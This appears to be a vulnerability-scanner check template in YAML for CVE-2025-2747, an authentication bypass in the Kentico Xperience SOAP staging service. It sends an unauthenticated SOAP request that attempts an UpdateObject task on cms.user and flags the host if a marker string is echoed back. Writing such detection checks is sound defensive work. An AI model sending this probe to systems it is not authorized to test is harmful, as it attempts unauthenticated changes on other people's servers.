tests/cve/CVE-2025-2747.yaml

uid: dc167220-f96b-4d4c-a047-7c76cdca0164
name: "Kentico Xperience CMS SOAP Staging Service Unauthenticated Access"
type: cve
cve: CVE-2025-2747
cvss: 9.8
severity: critical
confidence_base: 0.30
tags: [auth-bypass, soap, cms, kentico, kev]
services: [http, https]
author: noctis
version: "1.0.0"

steps:
  - id: soap-probe
    action: http_request
    method: POST
    path: "/CMSPages/Staging/SyncServer.asmx"
    port: "{{port}}"
    tls_insecure: true
    timeout_secs: 10
    headers:
      Content-Type: "text/xml; charset=utf-8"
      SOAPAction: '"http://www.kentico.com/ProcessSynchronizationTask"'
    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <ProcessSynchronizationTask xmlns="http://www.kentico.com/">
            <stagingTaskData>NOCTIS_PROBE_KENTICO_2025</stagingTaskData>
            <stagingTaskType>UpdateObject</stagingTaskType>
            <stagingTaskObjectType>cms.user</stagingTaskObjectType>
          </ProcessSynchronizationTask>
        </soap:Body>
      </soap:Envelope>
    store_as: soap_resp

  - id: soap-match
    action: match
    source: soap_resp.body
    pattern: "NOCTIS_PROBE_KENTICO_2025"
    condition: "soap_resp.status == 200"
    on_match:
      finding:
        confidence_delta: 0.62
        qod: 75
        evidence: "Kentico Xperience SOAP staging service auth bypass confirmed (CVE-2025-2747) — probe echoed back without authentication: {{soap_resp.body}}"
      stop: true
